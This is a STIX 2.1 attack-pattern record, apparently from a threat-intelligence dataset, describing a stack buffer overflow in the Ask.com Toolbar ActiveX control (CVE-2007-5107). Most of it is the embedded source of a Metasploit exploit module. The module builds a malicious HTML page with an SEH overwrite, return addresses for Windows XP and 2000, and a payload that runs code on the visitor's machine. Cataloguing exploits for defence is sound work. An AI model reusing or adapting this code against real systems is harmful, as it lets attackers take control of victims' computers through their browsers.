{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--66687eef-4fd9-4c63-86fd-4702ad89ac01",
    "created": "2024-08-14T16:43:52.278226Z",
    "modified": "2024-08-14T16:43:52.27823Z",
    "name": "Ask.com Toolbar askBar.dll ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Ask.com Toolbar 4.0.2.53. An attacker may be able to execute arbitrary code by sending an overly long string to the \"ShortFormat()\" method in askbar.dll.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ask_shortformat.rb",
            "external_id": "ask_shortformat.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5107"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ask.com Toolbar askBar.dll ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Ask.com Toolbar 4.0.2.53.\n        An attacker may be able to execute arbitrary code by sending an overly\n        long string to the \"ShortFormat()\" method in askbar.dll.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-5107' ],\n          [ 'OSVDB', '37735' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0/SP1 Pro English',     { 'Offset' => 2876, 'Ret' => 0x71aa32ad } ],\n          [ 'Windows 2000 Pro English ALL',       { 'Offset' => 1716, 'Ret' => 0x75022ac4 } ],\n        ],\n      'DisclosureDate' => '2007-09-24',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n      false\n  end\n\n  def check_dependencies\n      use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # Set the exploit buffer\n    filler = rand_text_alpha(target['Offset'])\n    seh = generate_seh_payload(target.ret)\n    sploit = filler + seh + rand_text_alpha(payload.encoded.length)\n\n    # Build out the message\n    content = %Q|<html>\n<object classid='clsid:5A074B2B-F830-49DE-A31B-5BB9D7F6B407' id='#{vname}'></object>\n<script language='javascript'>\n#{strname} = new String('#{sploit}');\n#{vname}.ShortFormat = #{strname}\n</script>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-09-24",
    "x_mitre_platforms": [
        "win'"
    ]
}